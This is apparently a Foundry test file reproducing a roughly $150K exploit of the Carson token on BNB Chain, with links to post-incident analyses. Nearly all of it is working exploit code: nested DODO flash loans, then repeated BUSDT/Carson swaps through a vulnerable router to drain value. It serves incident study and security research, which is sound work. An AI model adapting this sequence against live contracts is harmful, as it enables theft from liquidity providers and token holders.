// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~150K USD$
// Attacker : https://bscscan.com/address/0x25bcbbb92c2ae9d0c6f4db814e46fd5c632e2bd3
// Attack Contract : https://bscscan.com/address/0x9cffc95e742d22c1446a3d22e656bb23835a38ac
// Attack Tx : https://bscscan.com/tx/0x37d921a6bb0ecdd8f1ec918d795f9c354727a3ff6b0dba98a512fceb9662a3ac

// @Analysis
// https://twitter.com/BeosinAlert/status/1684393202252402688
// https://twitter.com/Phalcon_xyz/status/1684503154023448583
// https://twitter.com/hexagate_/status/1684475526663004160

contract CarsonTest is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Carson = IERC20(0x0aCD5019EdC8ff765517e2e691C5EeF6f9c08830);
    IDPPOracle DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPPOracle2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle3 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    // Closed source contract
    Uni_Router_V2 Router = Uni_Router_V2(0x2bDFb2f33E1aaEe08719F50d05Ef28057BB6341a);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 30_306_324);
        cheats.label(address(BUSDT), "BUSDT");
        cheats.label(address(Carson), "Carson");
        cheats.label(address(DPPOracle1), "DPPOracle1");
        cheats.label(address(DPPOracle2), "DPPOracle2");
        cheats.label(address(DPPOracle3), "DPPOracle3");
        cheats.label(address(DPP), "DPP");
        cheats.label(address(DPPAdvanced), "DPPAdvanced");
        cheats.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint(
            "Attacker balance of BUSDT before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker balance of BUSDT after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle2)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
        } else if (msg.sender == address(DPP)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
        } else {
            // Start exploit. Root cause of the exploit stem from the customized pair contract
            // Info from Phalcon (see above). To be updated
            BUSDT.approve(address(Router), type(uint256).max);
            Carson.approve(address(Router), type(uint256).max);
            BUSDTToCarson();
            for (uint256 i; i < 50; ++i) {
                CarsonToBUSDT(5000 * 1e18);
            }
            CarsonToBUSDT(Carson.balanceOf(address(this)));
            // End exploit
        }
        // Repaying flashloans
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function BUSDTToCarson() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(Carson);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1_500_000 * 1e18, 0, path, address(this), block.timestamp + 1000
        );
    }

    function CarsonToBUSDT(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(Carson);
        path[1] = address(BUSDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp + 1000
        );
    }
}
